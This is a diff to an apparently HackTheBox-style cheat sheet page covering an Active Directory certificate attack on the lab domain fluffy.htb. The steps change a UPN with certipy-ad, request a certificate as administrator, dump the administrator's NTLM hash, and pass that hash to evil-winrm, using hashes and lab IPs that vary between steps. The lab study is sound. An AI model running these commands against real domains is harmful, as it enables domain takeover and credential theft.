@@ -78,8 +78,11 @@
                     <pre><code class="language-bash">certipy-ad account -u 'ca_svc@fluffy.htb' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -upn 'administrator' -user 'ca_svc' update</code></pre>   
                     <p>Export the .ccache file (You must acquire it using shadow credential attack previously)</p>
                     <pre><code class="language-bash">export KRB5CCNAME=victim.ccache</code></pre>   
-                    <p>Request a certificate</p>
+                    <p>Request the certificate</p>
+                    certipy-ad req -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip '10.129.232.88' -target 'DC01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User' -dc-host '10.129.232.88'
+                    <p>Use the certificate</p>
                     <pre><code class="language-bash">certipy-ad auth -dc-ip '10.10.11.69' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'</code></pre>
+                    <p>This will dump the NTLM hash of the administrator user in this case</p>
                     <p>Use that hash to authenticate </p>
                     <pre><code class="language-bash">/usr/bin/evil-winrm -i 10.10.11.51 -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff</code></pre>
                 </ul>
